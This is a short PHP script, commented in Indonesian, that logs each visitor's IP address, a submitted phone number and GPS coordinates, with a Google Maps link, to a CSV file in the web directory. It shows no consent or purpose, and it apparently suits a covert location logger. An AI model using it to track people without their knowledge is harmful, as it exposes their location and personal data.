<?php
// post.php
header('Content-Type: application/json; charset=utf-8');

// ambil IP client dengan mengecek header umum
function client_ip() {
    $keys = ['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_CLIENT_IP','REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = $_SERVER[$k];
            if (strpos($ip, ',') !== false) {
                $parts = explode(',', $ip);
                return trim($parts[0]);
            }
            return trim($ip);
        }
    }
    return 'UNKNOWN';
}

$ip = client_ip();
$time = date('Y-m-d H:i:s');

// ambil POST data (sederhana)
$number = isset($_POST['number']) ? trim($_POST['number']) : '';
$lat = isset($_POST['lat']) ? trim($_POST['lat']) : '';
$lng = isset($_POST['lng']) ? trim($_POST['lng']) : '';

// validasi ringan
if ($lat !== '' && !is_numeric($lat)) {
    http_response_code(400);
    echo json_encode(['ok'=>false,'error'=>'lat invalid']);
    exit;
}
if ($lng !== '' && !is_numeric($lng)) {
    http_response_code(400);
    echo json_encode(['ok'=>false,'error'=>'lng invalid']);
    exit;
}

// siapkan CSV
$csvFile = __DIR__ . '/data.csv';
$isNew = !file_exists($csvFile);

// buka file dengan mode append dan lock
$fp = fopen($csvFile, 'a');
if (!$fp) {
    http_response_code(500);
    echo json_encode(['ok'=>false,'error'=>'cannot open file']);
    exit;
}

if (!flock($fp, LOCK_EX)) {
    fclose($fp);
    http_response_code(500);
    echo json_encode(['ok'=>false,'error'=>'cannot lock file']);
    exit;
}

// jika file baru, tulis header
if ($isNew) {
    fputcsv($fp, ['timestamp','ip','number','lat','lng','maps_link']);
}

// buat link Google Maps jika koordinat ada
$mapsLink = ($lat !== '' && $lng !== '') ? "https://www.google.com/maps?q={$lat},{$lng}" : '';

// tulis data (sanitize newline di number)
$safeNumber = str_replace(["\r","\n"], ' ', $number);
fputcsv($fp, [$time, $ip, $safeNumber, $lat === '' ? '' : (float)$lat, $lng === '' ? '' : (float)$lng, $mapsLink]);

// flush & unlock
fflush($fp);
flock($fp, LOCK_UN);
fclose($fp);

// balas JSON
echo json_encode(['ok'=>true, 'saved' => true, 'maps' => $mapsLink]);
exit;
?>
